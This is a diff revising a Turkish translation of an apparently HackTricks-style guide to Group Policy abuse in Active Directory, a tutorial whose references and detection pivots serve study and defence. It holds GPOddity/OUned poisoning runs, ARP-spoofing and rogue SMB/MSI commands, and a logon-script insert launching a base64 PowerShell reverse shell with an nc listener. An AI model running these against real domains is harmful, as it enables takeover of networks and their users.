+`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterilen görev yapısı, çalıştırılacak komut ve tetikleyiciler dahil olmak üzere zamanlanmış görevin ayrıntılarını belirtir. Bu dosya, zamanlanmış görevlerin GPO’lar içinde nasıl tanımlanıp yönetildiğini gösterir ve ilke uygulamasının bir parçası olarak rastgele komutlar veya betikler çalıştırmaya olanak tanır.
 
-GPO'lar ayrıca hedef sistemlerdeki user ve group üyeliklerinin değiştirilmesine olanak tanır. Attackers, Users and Groups policy file'larını doğrudan düzenleyerek user'ları yerel `administrators` group'u gibi privileged group'lara ekleyebilir. Bu, GPO yönetim izinlerinin devredilmesiyle mümkündür; bu izinler, yeni user'lar eklemek veya group üyeliklerini değiştirmek için policy file'larının değiştirilmesine olanak tanır.
+### Kullanıcılar ve Gruplar
 
-Users and Groups için XML configuration file, bu değişikliklerin nasıl uygulandığını gösterir. Bu dosyaya entries eklenerek belirli user'lara etkilenen sistemler genelinde elevated privileges verilebilir. Bu yöntem, GPO manipulation yoluyla privilege escalation için doğrudan bir yaklaşım sunar.
+GPO’lar ayrıca hedef sistemlerdeki kullanıcı ve grup üyeliklerinin değiştirilmesine de olanak tanır. Kullanıcılar ve Gruplar ilke dosyaları doğrudan düzenlenerek saldırganlar, kullanıcıları yerel `administrators` grubu gibi ayrıcalıklı gruplara ekleyebilir. GPO yönetim izinlerinin devredilmesi, yeni kullanıcılar eklemek veya grup üyeliklerini değiştirmek üzere ilke dosyalarının değiştirilmesine izin verdiğinden bu mümkündür.
 
-Bunun yanı sıra logon/logoff script'lerinden yararlanma, autorun'lar için registry key'lerini değiştirme, `.msi` file'ları aracılığıyla software yükleme veya service configuration'larını düzenleme gibi code execution ya da persistence sağlamak için ek yöntemler de değerlendirilebilir. Bu teknikler, GPO abuse yoluyla erişimi korumak ve hedef sistemleri kontrol etmek için çeşitli yollar sunar.
+Kullanıcılar ve Gruplar için XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını gösterir. Bu dosyaya girdiler eklenerek belirli kullanıcılara etkilenen sistemlerde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla ayrıcalık yükseltmeye doğrudan bir yol sunar.
 
-### GPC/GPT retrieval işlemini authenticated rogue service'lere yönlendirme
+Yerel grup üyeliği ve kullanıcı hakları gibi güvenlik ayarları için, `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` konumundaki uygulanmış GPO şablonunu ve `SecEdit` dizininin ACL’sini de inceleyin. Yazılabilir bir dizin veya dosya, inceleme için bir ipucudur: etkin SYSVOL paylaşım erişimi, deny ve devralınan ACL’ler, Group Policy container izinleri, ilke kapsamı ve istemci yenilemesi; değişikliğin etkili olup olmayacağını belirlemeye devam eder. “GPO Managers” adlı bir gruba üyelik tek başına düzenleme hakkı vermez. [Microsoft bu şablon yolunu ve Group Policy container/şablon ayrımını belgeliyor.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)
 
-Bir GPO, metadata içeren bir LDAP **Group Policy Container (GPC)** ile policy file'larını barındıran SMB-hosted bir **Group Policy Template (GPT)** öğesinden oluşur. Refresh sırasında client, container'ın `gPLink` değerini izler, referans verilen GPC'yi ve `gPCFileSysPath` değerini okur, ardından GPT'yi bu UNC path üzerinden indirir. Sonuç olarak, GPC'nin kendisine veya bir OU, Site ya da Domain'in `gPLink` değerine write access, privileged policy processing'e dönüştürülebilir.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>
+Ayrıca, oturum açma/kapatma betiklerinden yararlanma, otomatik çalıştırma için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya hizmet yapılandırmalarını düzenleme gibi kod çalıştırma ya da kalıcılığı sürdürmeye yönelik ek yöntemler de değerlendirilebilir. Bu teknikler, GPO’ların kötüye kullanılması yoluyla erişimi sürdürmek ve hedef sistemleri kontrol etmek için çeşitli yollar sunar.
 
-#### `gPCFileSysPath` poisoning with GPOddity
+### GPC/GPT alımını kimlik doğrulamalı sahte hizmetlere yönlendirme
 
-Controlled principal hedef GPC'ye write access elde edebiliyorsa (doğrudan veya **NTLM relay to LDAP** aracılığıyla), `gPCFileSysPath` değerini attacker tarafından barındırılan bir UNC path ile değiştirin. [GPOddity](https://github.com/synacktiv/GPOddity), LDAP değişikliğini otomatikleştirir ve Group Policy client'ın `NT AUTHORITY\SYSTEM` olarak çalıştırdığı module-based policy file'larını veya bir Immediate Task'ı içeren malicious bir GPT sunar.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>
+Bir GPO; meta verileri içeren bir LDAP **Group Policy Container (GPC)** ve ilke dosyalarını barındıran bir SMB **Group Policy Template (GPT)** bileşeninden oluşur. Yenileme sırasında istemci, container’ın `gPLink` değerini izler, başvurulan GPC’yi ve `gPCFileSysPath` değerini okur, ardından GPT’yi bu UNC yolundan indirir. Sonuç olarak, GPC’nin kendisine veya bir OU, Site ya da Domain’in `gPLink` değerine yazma erişimi, ayrıcalıklı ilke işlemesine dönüştürülebilir.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>
 
-Anonymous veya credentials'tan bağımsız bir SMB share, güncel Windows client'larında yeterli değildir: SMB Secure Negotiate, authentication'ın başarılı olduğuna dair kanıt gerektirir; bu nedenle rogue service, domain identity'yi doğrulamalı, SMB session key'i türetmeli ve response'larını doğru şekilde imzalamalıdır. Embedded mode'da GPOddity'yi controlled machine account ve bu account'ın service key'i ile yapılandırın, ardından `[COMMANDS]` section'ında computer-side veya user-side payload seçin.<sup>[[15]](#references)[[16]](#references)</sup>
+#### GPOddity ile `gPCFileSysPath` zehirleme
+
+Kontrol edilen principal hedef GPC’ye yazabiliyorsa (doğrudan ya da **LDAP’e NTLM relay** yoluyla), `gPCFileSysPath` değerini saldırganın barındırdığı bir UNC yoluyla değiştirin. [GPOddity](https://github.com/synacktiv/GPOddity), LDAP değişikliğini otomatikleştirir ve Group Policy istemcisinin `NT AUTHORITY\SYSTEM` olarak çalıştırdığı modül tabanlı ilke dosyaları veya bir Immediate Task içeren kötü amaçlı bir GPT sunar.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>
+
+Anonim veya kimlik bilgilerine bakılmaksızın erişilebilen bir SMB paylaşımı, güncel Windows istemcilerinde yeterli değildir: SMB Secure Negotiate, kimlik doğrulamanın başarılı olduğunun kanıtlanmasını gerektirir. Bu nedenle sahte hizmetin etki alanı kimliğini doğrulaması, SMB oturum anahtarını türetmesi ve yanıtlarını doğru şekilde imzalaması gerekir. Gömülü modda GPOddity’yi kontrol edilen bir makine hesabı ve bu hesabın hizmet anahtarıyla yapılandırın, ardından `[COMMANDS]` bölümünde bilgisayar veya kullanıcı tarafı payload’ını seçin.<sup>[[15]](#references)[[16]](#references)</sup>
+
 ```ini
 [SMB]
 smb-mode=embedded
@@ -243,40 +288,46 @@ smb-iface=eth0
 ```bash
 python3 gpoddity.py --config config.ini -v
 ```
-**Kullanıcı GPO uç durumu:** MS16-072 sonrasında Windows, **aynı TCP bağlantısı** içinde hâlâ iki SMB2 oturumu oluşturur: kullanıcı oturumu `GPT.INI` dosyasını okur, ardından bilgisayar hesabı oturumu `ScheduledTasks.xml` gibi etkin yapılandırmayı okur. Bu nedenle sahte bir sunucu, kimlik doğrulama durumunu, oturum anahtarlarını ve imzalama anahtarlarını yalnızca sokete göre değil, SMB2 `SessionId` değerine göre indekslemelidir. GPOddity/OUned içine gömülü Scapy fork'u bunu `SMBStreamSocketMultiplexing` ve çoklama destekli `SMBServer` üzerinden uygular; tek oturumlu Impacket/Scapy sunucuları ise aksi hâlde yanlış imzalama durumunu yeniden kullanır ve kullanıcı ilkelerinde başarısız olur.<sup>[[15]](#references)</sup>
 
-#### OUned ile `gPLink` poisoning
+**Kullanıcı GPO uç durumu:** MS16-072 sonrasında Windows, **aynı TCP bağlantısında** hâlâ iki SMB2 oturumu oluşturur: kullanıcı oturumu `GPT.INI` dosyasını, ardından bilgisayar hesabı oturumu `ScheduledTasks.xml` gibi etkin yapılandırmaları okur. Bu nedenle sahte bir sunucu, kimlik doğrulama durumunu, oturum anahtarlarını ve imzalama anahtarlarını yalnızca sokete göre değil, SMB2 `SessionId` değerine göre de indekslemelidir. GPOddity/OUned içine gömülü Scapy fork'u bunu `SMBStreamSocketMultiplexing` ve çoklama destekli bir `SMBServer` üzerinden uygular; tek oturumlu Impacket/Scapy sunucuları aksi hâlde yanlış imzalama durumunu yeniden kullanır ve kullanıcı ilkelerinde başarısız olur.<sup>[[15]](#references)</sup>
 
-Bir OU, Site veya Domain üzerinde `WriteGPLink`, `GenericWrite` ya da eşdeğer denetime sahip olan bir saldırgan, GPC DN'si saldırganın kontrolündeki bir LDAP host'u tarafından sunulan bir bağlantı ekleyebilir. Bu teknik ilk olarak Petros Koutroumpis tarafından sunulmuştur; [OUned](https://github.com/synacktiv/OUned), LDAP yazma işlemini ve kötü amaçlı GPC/GPT zincirini otomatikleştirir.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
+#### OUned ile `gPLink` zehirleme
+
+Bir OU, Site veya Domain üzerinde `WriteGPLink`, `GenericWrite` ya da eşdeğer kontrol sahibi olan bir saldırgan, GPC DN'si saldırganın kontrolündeki bir LDAP sunucusu tarafından sunulan bir bağlantı ekleyebilir. Bu yöntem ilk olarak Petros Koutroumpis tarafından tanıtılmıştır; [OUned](https://github.com/synacktiv/OUned), LDAP yazma işlemini ve kötü amaçlı GPC/GPT zincirini otomatikleştirir.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
+
 ```text
 [LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
 ```
-Kurban önce sahte LDAP service'e authenticate olur ve `gPCFileSysPath` değeri sahte SMB service'i gösteren bir GPC alır; ardından SMB'ye authenticate olur ve sağlanan GPT'yi uygular. Bu nedenle OUned'in LDAP SPN'ine sahip bir hesaba, SMB için HOST SPN'ine sahip bir machine account'a (aynı machine account her ikisini de karşılayabilir) ve 389 ile 445 portlarını operator host'a yönlendiren DNS çözümlemesine veya reverse forwarding'e ihtiyacı vardır.<sup>[[15]](#references)[[17]](#references)</sup>
+
+Kurban önce sahte LDAP hizmetinde kimlik doğrulaması yapar ve `gPCFileSysPath` değeri sahte SMB hizmetini gösteren bir GPC alır; ardından SMB'de kimlik doğrulaması yapar ve sağlanan GPT'yi uygular. Bu nedenle OUned'in LDAP SPN'sine sahip bir hesaba, SMB için HOST SPN'sine sahip bir makine hesabına (aynı makine hesabı her ikisini de karşılayabilir) ve 389 ile 445 numaralı portları operatörün ana bilgisayarına yönlendiren DNS çözümlemesine veya ters yönlendirmeye ihtiyacı vardır.<sup>[[15]](#references)[[17]](#references)</sup>
+
 ```bash
 python3 OUned.py --config config.ini -v
 ```
-OUned'ın gömülü Scapy LDAP server'ı, Kerberos/SPNEGO'yu gerçek kontrollü service key ile doğrular ve JSON'dan rastgele GPC verileri sunar. Boş JSON anahtarı rootDSE'yi modeller, `base64:` önekleri binary değerleri temsil eder ve server; add/delete/modify/search işlemlerinin yanı sıra `BASE`, `LEVEL` ve `SUBTREE` search'lerini destekler. Ayrıca korumasızlık, integrity veya confidentiality arasında negotiation yapabilir. Bu, başka bir Windows bileşeni attacker-controlled bir LDAP reference'ını takip ettiğinde ancak authenticated LDAP konusunda ısrar ettiğinde service'i yeniden kullanılabilir hâle getirir.<sup>[[15]](#references)</sup>
 
-Bir account password'ını dummy domain'e senkronize etmenin her Kerberos key'ini yeniden oluşturduğunu varsaymayın: RC4 password'dan türetilirken AES string-to-key işlemi, principal'ın hostname/domain'inden türetilen bir salt da kullanır. Gerçek account AES key'ini `KerberosSSP`'ye vermek, machine account'ın kendisinin yazabildiği `msDS-SupportedEncryptionTypes` üzerinde tespit edilebilir bir değişiklik yaparak RC4'ü zorlamayı önler.<sup>[[15]](#references)</sup>
+OUned'in yerleşik Scapy LDAP sunucusu, Kerberos/SPNEGO'yu gerçek denetimli service key ile doğrular ve JSON'dan keyfi GPC verileri sunar. Boş JSON key'i rootDSE'yi modeller, `base64:` önekleri binary değerleri temsil eder ve sunucu add/delete/modify/search işlemlerini ve `BASE`, `LEVEL` ile `SUBTREE` aramalarını destekler; koruma olmadan, integrity veya confidentiality ile anlaşma yapabilir. Böylece başka bir Windows bileşeni saldırgan kontrollü bir LDAP referansını izlerken authenticated LDAP konusunda ısrar ettiğinde bu hizmet yeniden kullanılabilir.<sup>[[15]](#references)</sup>
 
-#### Detection pivots
+Bir hesap parolasını dummy bir domaine eşitlemenin her Kerberos key'ini yeniden oluşturduğunu varsaymayın: RC4 paroladan türetilirken AES string-to-key, principal'ın hostname/domain bilgisinden türetilen bir salt de kullanır. Gerçek hesap AES key'ini `KerberosSSP`'ye vermek, makine hesabının kendi kendine yazabildiği `msDS-SupportedEncryptionTypes` üzerinde tespit edilebilir bir değişiklik yaparak RC4'ü zorlamayı önler.<sup>[[15]](#references)</sup>
 
-`gPCFileSysPath` veya `gPLink` değişikliklerini GPO version değişiklikleri ve yeni Immediate/Scheduled Task XML'leriyle ilişkilendirin. Beklenmeyen naming context'lere giden link'leri, onaylanan DC/SYSVOL kümesinin dışındaki UNC host'larını, machine-account adlarını yönlendiren DNS kayıtlarını, alışılmadık machine account'lar için LDAP/CIFS service ticket'larını ve RC4'ü etkinleştiren `msDS-SupportedEncryptionTypes` değişikliklerini araştırın.<sup>[[15]](#references)</sup>
+#### Tespit için inceleme noktaları
+
+`gPCFileSysPath` veya `gPLink` değişikliklerini GPO sürüm değişiklikleri ve yeni Immediate/Scheduled Task XML dosyalarıyla ilişkilendirin. Beklenmeyen naming context'lere bağlantıları, onaylı DC/SYSVOL kümesinin dışındaki UNC host'larını, makine hesabı adlarını başka yere yönlendiren DNS kayıtlarını, sıra dışı makine hesaplarına ait LDAP/CIFS service ticket'larını ve RC4'ü etkinleştiren `msDS-SupportedEncryptionTypes` değişikliklerini inceleyin.<sup>[[15]](#references)</sup>
 
 ### WriteGPLink + UNC path hijacking (ARP spoofing)
 
-Bir OU/domain üzerinde `WriteGPLink`, hedef container'ın `gPLink` attribute'unu değiştirmenize ve GPO'nun kendisini düzenlemeden **mevcut bir GPO'nun uygulanmasını zorlamanıza** olanak tanır. Bu, linked GPO zaten **UNC paths** (`\\HOST\share\...`) üzerinden remote content'a reference verdiğinde ilgi çekici hâle gelir; çünkü authenticated users **SYSVOL**'u okuyabilir ve yeniden kullanılabilir policy'leri offline olarak arayabilir.<sup>[[11]](#references)</sup>
+Bir OU/domain üzerinde `WriteGPLink`, GPO'nun kendisini düzenlemeden hedef container'ın `gPLink` niteliğini değiştirmenize ve **mevcut bir GPO'yu uygulanmaya zorlamanıza** olanak tanır. Bağlanan GPO, **UNC path** (`\\HOST\share\...`) üzerinden uzak içeriğe zaten başvuruyorsa bu ilgi çekici hâle gelir; çünkü authenticated kullanıcılar **SYSVOL**'u okuyabilir ve yeniden kullanılabilir politikaları çevrimdışı olarak arayabilir.<sup>[[11]](#references)</sup>
 
 Üst düzey iş akışı:
 
-1. BloodHound kullanarak bir OU üzerinde `WriteGPLink` sahibi bir principal belirleyin ve bu OU içindeki computer/user'ları enumerate edin.
-2. `SYSVOL`'u read-only olarak clone edin ve UNC paths'e reference veren **Software Installation**, **drive mappings** (`Drives.xml`) ve **logon/startup scripts** aramak için GPO'ları parse edin.
-3. DFS/domain-namespace paths yerine **doğrudan hostname**'e işaret eden policy'leri (örneğin `\\DC02\share\pkg.msi`) tercih edin; çünkü hostname tabanlı path'leri L2 spoofing ile yönlendirmek daha kolaydır.
-4. Victim'ın mevcut policy'yi işlemesini sağlamak için seçilen GPO GUID'sini hedef OU'nun `gPLink`'ine ekleyin.
-5. Aynı broadcast domain üzerinde UNC host'una ARP spoofing uygulayın ve IP'sini yerel olarak bind edin (`ip addr add <target_ip>/32 dev <iface>`); böylece victim'ın SMB trafiği host'unuza ulaşır.
-6. Beklenen path/filename'i bir attacker SMB server'ından (örneğin `smbserver.py`) sunun ve normal policy processing'i bekleyin.
+1. Bir OU üzerinde `WriteGPLink` yetkisine sahip bir principal belirlemek ve bu OU içindeki bilgisayarları/kullanıcıları listelemek için BloodHound kullanın.
+2. `SYSVOL`'u salt okunur şekilde klonlayın ve UNC path'lere başvuran **Software Installation**, **drive mappings** (`Drives.xml`) ve **logon/startup scripts** aramak için GPO'ları ayrıştırın.
+3. L2 spoofing ile yönlendirmek daha kolay olduğundan, DFS/domain-namespace path'leri yerine **doğrudan hostname'e** işaret eden politikaları tercih edin (örneğin `\\DC02\share\pkg.msi`).
+4. Kurbanın önceden mevcut olan bu politikayı işlemesi için seçilen GPO GUID'sini hedef OU'nun `gPLink` niteliğine ekleyin.
+5. Aynı broadcast domain üzerinde UNC host'una ARP spoofing uygulayın ve IP'sini yerel olarak bağlayın (`ip addr add <target_ip>/32 dev <iface>`); böylece kurbanın SMB trafiği sizin host'unuza ulaşır.
+6. Beklenen path/filename'i bir saldırgan SMB sunucusundan sunun (örneğin `smbserver.py`) ve normal politika işleme sürecini bekleyin.
 
-Örnek `SYSVOL` toplama ve GPO ilişkilendirmesi:
+Örnek `SYSVOL` toplama ve GPO korelasyonu:
+
 ```bash
 mkdir -p /mnt/$DOMAIN/SYSVOL/
 mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
@@ -285,74 +336,88 @@ python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
 python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
 python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
 ```
+
 Mevcut GPO'yu hedef OU'ya bağlayın:
+
 ```bash
 python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
---gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
+  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
 ```
+
 #### Software Installation UNC hijack -> SYSTEM
 
-Bağlantılı GPO, bir MSI dosyasını UNC path üzerinden dağıtıyorsa istemci bunu **computer startup** sırasında alır ve **`NT AUTHORITY\SYSTEM`** olarak kurar. Referans verilen host'u spoof edip aynı share/path/name altında malicious bir MSI sunarak **SYSVOL'u değiştirmeden** `WriteGPLink` işlemini SYSTEM code execution'a dönüştürebilirsiniz.
+Bağlı GPO, bir MSI'ı UNC path üzerinden dağıtıyorsa istemci bu MSI'ı **computer startup** sırasında indirir ve **`NT AUTHORITY\SYSTEM`** olarak yükler. Başvurulan host'u spoof edip aynı **share/path/name** altında kötü amaçlı bir MSI sunarak **SYSVOL**'u değiştirmeden `WriteGPLink` üzerinden SYSTEM seviyesinde kod çalıştırabilirsiniz.
 
 Önemli kısıtlamalar:
 
-- **Timing matters**: Yeni link policy refresh sırasında (genellikle ~90 dakika) görülür; ancak **Software Installation** genellikle **reboot** sırasında tetiklenir.
-- Windows Installer dağıtımı genellikle package **`ProductCode`** üzerinden takip eder. Ürün zaten kuruluysa dağıtım atlanabilir.
-- Installer rejection'ı önlemek için rogue MSI'ı, **`ProductCode`** ve **`PackageCode`** değerleri GPO'nun beklediği legitimate package ile eşleşecek şekilde patch'leyin.
-- Eski `.aas` advertisement dosyaları `SYSVOL` içinde kalabilir; bu nedenle ona güvenmeden önce deployment'ın hâlâ active göründüğünü doğrulayın.
+- **Zamanlama önemlidir**: Yeni bağlantı policy refresh sırasında (genellikle ~90 dakikada bir) görülür, ancak **Software Installation** genellikle **reboot** sırasında tetiklenir.
+- Windows Installer, dağıtımı genellikle paketin **`ProductCode`** değeriyle takip eder. Ürün zaten yüklüyse dağıtım atlanabilir.
+- Installer'ın paketi reddetmesini önlemek için rogue MSI'ı yamalayarak **`ProductCode`** ve **`PackageCode`** değerlerini GPO'nun beklediği meşru paketle eşleştirin.
+- Eski `.aas` advertisement dosyaları `SYSVOL` içinde kalabilir. Bu yönteme güvenmeden önce dağıtımın hâlâ etkin göründüğünü doğrulayın.
+
 ```bash
 ip addr add <unc_host_ip>/32 dev <iface>
 arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
 smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
 ```
+
 #### Drive-map UNC hijack -> NTLM capture / WebDAV relay
 
-`Drives.xml` içindeki GPP drive mapping'leri, kullanıcıların logon veya yeniden bağlantı sırasında yapılandırılmış UNC path'e authenticate olmasına neden olur. Referans verilen host'u spoof ederseniz **NetNTLMv2** yakalayabilirsiniz. SMB'nin kasıtlı olarak başarısız olması sağlanırsa Windows **WebDAV** üzerinden yeniden deneme yapabilir ve **LDAP(S)**, **AD CS** veya **SMB**'ye relay için çok daha esnek olan **HTTP üzerinden NTLM** gönderebilir.
+`Drives.xml` içindeki GPP drive mapping'leri, kullanıcıların oturum açarken veya yeniden bağlanırken yapılandırılmış UNC path'e kimlik doğrulaması yapmasına neden olur. Başvurulan host'u spoof ederseniz **NetNTLMv2** yakalayabilirsiniz. SMB'nin kasıtlı olarak başarısız olmasını sağlarsanız Windows, **WebDAV** üzerinden yeniden deneyebilir ve **HTTP üzerinden NTLM** gönderebilir. Bu, **LDAP(S)**, **AD CS** veya **SMB**'ye relay için çok daha fazla esneklik sağlar.
 
 #### Logon/startup script UNC hijack
 
 Aynı yöntem `SYSVOL` içinde bulunan UNC-hosted script'ler için de geçerlidir:
 
-- **Logon script'leri** genellikle **user** context'inde çalışır.
-- **Startup script'leri** genellikle **computer / SYSTEM** context'inde çalışır.
+- **Logon script**'ler genellikle **user** bağlamında çalışır.
+- **Startup script**'ler genellikle **computer / SYSTEM** bağlamında çalışır.
 
-Script path'i spoof edilebilir bir hostname'e işaret ediyorsa UNC host'unu yönlendirin ve beklenen konumdan replacement script içeriği sunun.
+Script path spoof edilebilir bir hostname'e işaret ediyorsa UNC host'u yönlendirin ve beklenen konumdan değiştirilmiş script içeriği sunun.
 
 ## SYSVOL/NETLOGON Logon Script Poisoning
 
-`\\<dc>\SYSVOL\<domain>\scripts\` veya `\\<dc>\NETLOGON\` altındaki writable path'ler, GPO aracılığıyla user logon sırasında çalıştırılan logon script'lerinin değiştirilmesine olanak tanır. Bu, logon olan kullanıcıların security context'inde code execution sağlar.
+`\\<dc>\SYSVOL\<domain>\scripts\` veya `\\<dc>\NETLOGON\` altındaki yazılabilir path'ler, GPO aracılığıyla kullanıcı oturum açarken çalıştırılan logon script'lerin kurcalanmasına olanak tanır. Bu, oturum açan kullanıcıların güvenlik bağlamında code execution sağlar.
 
-### Logon script'lerini bulma
-- Yapılandırılmış bir logon script'i için user attribute'larını inceleyin:
+### Logon script'leri bulma
+- Yapılandırılmış bir logon script olup olmadığını görmek için kullanıcı özniteliklerini inceleyin:
+
 ```powershell
 Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
 ```
-- Betiklere yönelik kısayolları veya referansları ortaya çıkarmak için domain paylaşımlarını tarayın:
+
+- Kısayolları veya script referanslarını ortaya çıkarmak için domain paylaşımlarını tarayın:
+
 ```bash
 # NetExec spider (authenticated)
 netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
 ```
-- SYSVOL/NETLOGON'a işaret eden hedefleri çözümlemek için `.lnk` dosyalarını ayrıştırın (yararlı bir DFIR hilesi ve doğrudan GPO erişimi olmayan saldırganlar için):
+
+- SYSVOL/NETLOGON içindeki hedefleri bulmak için `.lnk` dosyalarını ayrıştırın (faydalı bir DFIR numarası ve doğrudan GPO erişimi olmayan saldırganlar için):
+
 ```bash
 # LnkParse3
 lnkparse login.vbs.lnk
 # Example target revealed:
 # C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
 ```
-- BloodHound, mevcut olduğunda kullanıcı düğümlerinde `logonScript` (scriptPath) özniteliğini görüntüler.
 
-### Yazma erişimini doğrulayın (paylaşım listelerine güvenmeyin)
-Automated tooling, SYSVOL/NETLOGON'u salt okunur olarak gösterebilir; ancak temel NTFS ACL'leri yine de yazma iznine izin verebilir. Her zaman test edin:
-```bash
-# Interactive write test
-smbclient \\<dc>\SYSVOL -U <user>%<pass>
-smb: \\> cd <domain>\scripts\
-smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
+- BloodHound, mevcut olduğunda kullanıcı nesnesinin `scriptPath` logon-script özniteliğini gösterir. GPO ile yapılandırılan logon script’leri ayrı bir policy referansıdır; bu nedenle ilgili GPO’yu da inceleyin.
+
+### Yazma erişimini doğrulayın (share listelerine güvenmeyin)
+Otomatik araçlar, ilgili script’in NTFS ACL’si farklı olsa bile SYSVOL/NETLOGON’u salt okunur olarak gösterebilir. Önce bu dosyayı ve üst dizinini salt okunur şekilde inceleyin; eşleşen Allow ACE’ler olası adaylardır, çünkü etkin SMB ve NTFS erişimi, Deny ACE’ler ve mevcut token’ın tümü önemlidir:
+
+```powershell
+Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
+  Format-List Owner,AccessToString
+Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
+  Format-List Owner,AccessToString
 ```
-Dosya boyutu veya mtime değişiyorsa write erişiminiz vardır. Değişiklik yapmadan önce orijinalleri koruyun.
 
-### RCE için bir VBScript logon script'ini zehirleyin
-Bir PowerShell reverse shell başlatan bir komut ekleyin (revshells.com üzerinden oluşturun) ve business function'ın bozulmasını önlemek için orijinal mantığı koruyun:
+Yetkili bir yazma testi hedefe özel ve geri alınabilir olmalı; orijinal script yedeklenip geri yüklenmelidir. Erişimi test etmek için çalışan bir logon script'in üzerine yazmayın; başarılı bir yazma işlemi, bir sonraki kullanıcının logon olmasıyla çalışabilir.
+
+### RCE için bir VBScript logon script'ini zehirleme
+İşlevselliği bozmamak için orijinal mantığı koruyarak, PowerShell reverse shell başlatan bir komut ekleyin (revshells.com üzerinden oluşturun):
+
 ```vb
 ' At top of login.vbs
 Set cmdshell = CreateObject("Wscript.Shell")
@@ -362,32 +427,35 @@ cmdshell.run "powershell -e <BASE64_PAYLOAD>"
 MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
 MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
 ```
-Host'unuzda dinleme yapın ve bir sonraki etkileşimli oturum açmayı bekleyin:
+
+Ana makinenizde dinleyin ve bir sonraki etkileşimli oturum açmayı bekleyin:
+
 ```bash
 rlwrap -cAr nc -lnvp 443
 ```
+
 Notlar:
-- Çalıştırma, logging yapan kullanıcının token'ı altında gerçekleşir (SYSTEM değil). Kapsam, bu script'i uygulayan GPO link'idir (OU, site, domain).
+- Çalıştırma, SYSTEM yerine günlük kaydı tutan kullanıcının token'ı altında gerçekleşir. Kapsam, bu script'i uygulayan GPO bağlantısıdır (OU, site, domain).
 - Kullanımdan sonra özgün içeriği/zaman damgalarını geri yükleyerek temizleyin.
 
 
 ## References
 
-- [1] [Active Directory ACL'lerini/ACE'lerini Abuse Etme](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
+- [1] [Active Directory ACL/ACE'lerini kötüye kullanma](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 - [2] [Ayrıcalıklı Hesaplar ve Token Ayrıcalıkları](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
-- [3] [BloodHound 1.3 – ACL Attack Path Güncellemesi](https://wald0.com/?p=112)
+- [3] [BloodHound 1.3 – ACL Saldırı Yolu Güncellemesi](https://wald0.com/?p=112)
 - [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
-- [5] [Active Directory'de ACL'lerle Ayrıcalıkları Yükseltme](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
-- [6] [Active Directory Ayrıcalıkları ve Ayrıcalıklı Hesapları Tarama](https://adsecurity.org/?p=3658)
+- [5] [Active Directory'de ACL'lerle ayrıcalık yükseltme](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+- [6] [Active Directory Ayrıcalıklarını ve Ayrıcalıklı Hesapları Tarama](https://adsecurity.org/?p=3658)
 - [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
-- [8] [BloodyAD – Linux'tan AD attribute/UAC operasyonları](https://github.com/CravateRouge/bloodyAD)
-- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
-- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking ve DC admin'e DPAPI decryption](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
-- [11] [TrustedSec - ARP Around and Find Out: Code Execution ve NTLM Relay için GPO UNC Path'lerini Hijack Etme](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
-- [12] [GPOddity: Active Directory GPO'larını NTLM relaying ve daha fazlası üzerinden exploit etme](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
